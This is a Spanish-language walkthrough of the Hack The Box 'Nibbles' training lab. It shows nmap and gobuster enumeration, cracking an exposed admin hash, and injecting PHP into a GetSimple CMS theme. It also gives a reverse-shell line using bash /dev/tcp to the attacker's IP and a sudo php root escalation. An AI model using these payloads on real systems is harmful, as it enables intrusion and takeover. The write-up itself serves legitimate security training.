# Ruta de aprendizaje: “Módulo Getting Started – Máquina Nibbles”

Finalizado este módulo, catalogado por Hack The Box como “Fundamental y Offensivo”, compuesto por 23 secciones, debemos vulnerar la máquina Nibbles, siendo esta máquina de dificultad muy fácil.

Lo primero que debemos hacer una vez tenemos el target (IP objetivo) haremos un escaneo nmap de todos los puertos. (En otra sección explicamos como conectarse a la VPN de HTB) pero para este ejemplo suponemos que ya hemos finalizado el módulo y sabemos hacerlo.

**Nmap:**

Bash

```
sudo nmap -p- -sS --open -vvv -n -Pn 10.129.42.249 -oA ./fullports
```

- `-p-` : Todos los puertos (los 65535)
    
- `-sS` : Stealth scan (escaneo silencioso) para enviar paquetes SYN únicamente no espera a que el three-way handshake se complete, es decir, envía el paquete SYN, recibe el SYN-ACK y no devuelve el ACK, de esta forma tenemos que puertos están abiertos siendo mas sigilosos.
    
- `--open` : Solo muestra puertos abiertos-
    
- `-Pn` : No hace ping, nmap asume que el puerto está abierto y lo escanea (aumentamos velocidad)
    
- `-n` : Estamos escaneando una IP, no nos interesa que nmap haga resolución de DNS, por ahora no nos importa si esa IP está asociada a una dirección del tipo [www.loquesea.com](https://www.google.com/search?q=https://www.loquesea.com&authuser=1)
    
- `-oA` : El “Output” es decir el archivo con la información del escanea en todos los formatos (por si nos hace falta mas de un formato).

![imagen](/assets/nibbles/imagen1.png)

Con este escaneo vemos que tenemos abierto el puerto 22 “ssh” y el 80 “http” y que por el ttl es una máquina Linux (ttl= 64 linux, ttl=128 Windows), por lo que es hora de centrarnos en realizar un escaneo mas profundo.

**Comando nmap:**

Bash

```
sudo nmap -p22,80 -sCV -sS -Pn 10.10.14.124 -oA ./ports
```

- `-sCV`: El parámetro “C” sirve para escanear utilizando los scripts mas comunes de NMAP y la “V” para escanear las versiones de esos servicios. 

![imagen](/assets/nibbles/imagen2.png)

Bueno esta es la información que nos da, el servidor http es un apache de versión 2.4.41 y tenemos un titulo que nos puede dar una pista….

**Welcome to “Getsimple”** ¿Debemos buscar que es eso de GetSimple?

Por ahora vamos a realizar una numeración activa con la herramienta Gobuster, para ver que rutas existen dentro de la dirección objetivo, para ello usaremos el siguiente comando:

Bash

```
gobuster dir -u http://10.129.42.249 -w /usr/share/wordlists/dirb/common.txt
```

![Imagen](/assets/nibbles/imagen3.png)

Tenemos distintas rutas, ahora tenemos que ir investigando una a una a ver si sacamos algo de información relevante.

Despues de navegar por las distintas rutas descubrimos algo muy interesante, dentro de `/data` existe una carpeta `users` (entre otras), y dentro de `users` un archivo `admin.xml`.

![Imagen](/assets/nibbles/imagen4.png)
![Imagen](/assets/nibbles/imagen5.png)


Ya tenemos al usuario **admin** y… `<PWD>` ese conjunto de caracteres ¿no parece ser algo cifrado?, podemos intentar crackearla con herramientas como jhon the riper o hashcat pero vamos a lo mas rápido, vamos a aprovecharnos de páginas web que sin saber que tipo de hash es (md5, sh1 ec…) en este caso utilizaremos la herramienta web “hashes.com”.
![Imagen](/assets/nibbles/imagen6.png)

Bingo! Ese hash está en formato SH1 y corresponde con la palabra **admin** (no se complicó mucho ese administrador xD).

![Imagen](/assets/nibbles/imagen7.png)

![Imagen](/assets/nibbles/imagen8.png)
Ya tendríamos el usuario y la contraseña `admin:admin`.

En este punto tenemos que preguntarnos, ¿Qué es eso de GetSimple? Ya nos salió en nuestra enumeración de Nmap pero es hora de “googlear”.

![Imagen](/assets/nibbles/imagen9.png)

En nuestro caso la versión de GetSimple es la 3.3.15, esto se ve sumergiéndonos en los códigos html de las páginas, o incluso en la propia interfaz gráfica de la página, por ejemplo en `http://IP/admin`.

![Imagen](/assets/nibbles/imagen10.png)

Parece que tiene una vulnerabilidad consistente en la carga de archivos php maliciosos, por lo que como ya podemos entrar al panel de control como admins, vamos a buscar alguna sección donde podamos subir un archivo php y ver si nos deja insertar comandos.

En el “Theme editor” de la sección theme podemos ver que tenemos varias plantillas, vamos a coger una, por ejemplo `slidebar.inc.php` y vamos a insertar al final de todo el código la siguiente instrucción:

PHP

```
<?php phpinfo(); ?>
```

![Imagen](/assets/nibbles/imagen11.png)

![Imagen](/assets/nibbles/imagen12.png)

Guardamos cambios y recargamos la página principal y BINGO! Comprobamos que la web es vulnerable.

![Imagen](/assets/nibbles/imagen13.png)

Podemos probar otro código como por ejemplo `whoami` para ver quienes somos, volvemos al Theme editor y ponemos esta vez.

![Imagen](/assets/nibbles/imagen14.png)

![Imagen](/assets/nibbles/imagen15.png)

Ahí lo tenemos, somos `www-data`. Vamos al turrón, vamos a crear una reverse Shell aprovechándonos de esta vulnerabilidad.

En nuestra máquina local montamos un servidor en escucha con el comando:

Bash

```
nc -nlvp 4444
```

- `nc`: Netcat
    
- `-nlvp`: n= sin resolución de dns, l= listen (modo escucha), v=verbose (para ver lo que nos entra) p= puerto, en este caso el 4444, pero podría ser cualquier otro.
    

Una vez que nos ponemos en escucha en el Theme editor vamos a poner el siguiente comando:

PHP

```
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'"); ?>
```

`TU_IP` debe de ser la ip TUN0 o lo que es lo mismo la IP que te asigna la máquina de HTB a tu equipo.

Y en el momento de cargar la página en nuestro listener deberíamos de tener ya nuestra reverse Shell operativa.

![Imagen](/assets/nibbles/imagen19.png)

![Imagen](/assets/nibbles/imagen20.png)

![Imagen](/assets/nibbles/imagen21.png)

En este momento vamos a hacer el tratamiento de la TTY, ¿para que? Porque cuando obtenemos una reverse Shell es tan básica que es muy poco operativa, por ejemplo, no nos sirven las flechas del teclado, el control+C nos sacaría de la Shell y lo que queremos es tener una Shell interactiva y funcional.

El tratamiento lo haremos de la siguiente forma, y con estos pasos uno a uno:

En la reverseshell:

Bash

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

`Ctrl+Z`

Bash

```
stty raw -echo; fg
```

Ya tenemos una Shell interactiva, adicionalmente podemos irnos a un terminal nuevo y ver la cantidad de filas y columnas que tiene nuestra Shell, para ello ponemos el comando: `stty size`

Y lo que nos de lo ponemos en la reverse Shell con el comando `stty rows “filas” columns “columnas”` en mi caso 44 filas y 183 columnas.

![Imagen](/assets/nibbles/imagen22.png)

![Imagen](/assets/nibbles/imagen23.png)

Como en las indicaciones de HTB nos dice que tenemos que ver la flag del archivo `user.txt`, sencillamente lo buscamos con el comando `find` y lo obtenemos.

![Imagen](/assets/nibbles/imagen24.png)

Ahora solo nos falta escalar privilegios, buscar SUID mal configurados, tareas CRON etc… pero para esta máquina sencilla el primer paso que normalmente tendríamos que hacer que es ver la configuración de los sudoers ya vamos a tener la clave.

Con el comando `sudo -l` vamos a listar si existe algún recurso que podemos ejecutar como root, y en este caso sería el archivo `/usr/bin/php` así que vamos al turrón.

Simplemente vamos a invocar una Shell como root aprovechando ese privilegio con uno de los siguientes comandos:

Bash

```
sudo php -r "pcntl_exec('/bin/bash');"
```

Bash

```
sudo php -r 'system("/bin/bash");'
```

![Imagen](/assets/nibbles/imagen25.png)

Ya lo tenemos, hemos escalado privilegios y ya somos el usuario root. Hemos finalizado con la explotación de la máquina Nibbles del módulo Getting started.